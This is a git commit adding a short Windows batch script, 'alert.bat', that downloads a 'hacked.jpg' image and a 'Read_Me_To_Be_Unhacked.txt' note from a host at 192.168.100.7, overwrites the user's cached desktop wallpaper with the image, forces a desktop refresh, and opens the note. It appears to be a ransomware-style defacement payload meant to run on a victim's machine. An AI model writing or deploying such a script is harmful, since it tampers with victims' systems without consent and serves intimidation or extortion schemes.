fb6edcb6a33b665bdd53eb7af0cfde24f25e1d49
joebarouk <101946493+joebarouk@users.noreply.github.com>
2024-02-04 18:58:57 +0200

    Add files via upload

---
+++ notice/alert.bat
@@ -0,0 +1,8 @@
+curl -O 192.168.100.7/notice/hacked.jpg
+curl -O 192.168.100.7/notice/Read_Me_To_Be_Unhacked.txt
+
+copy /Y hacked.jpg %appdata%\Microsoft\Windows\Themes\TranscodedWallpaper
+copy /Y hacked.jpg %appdata%\Microsoft\Windows\Themes\CachedFiles\CachedImage_1024_768_POS4.jpg
+RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters
+
+Read_Me_To_Be_Unhacked.txt
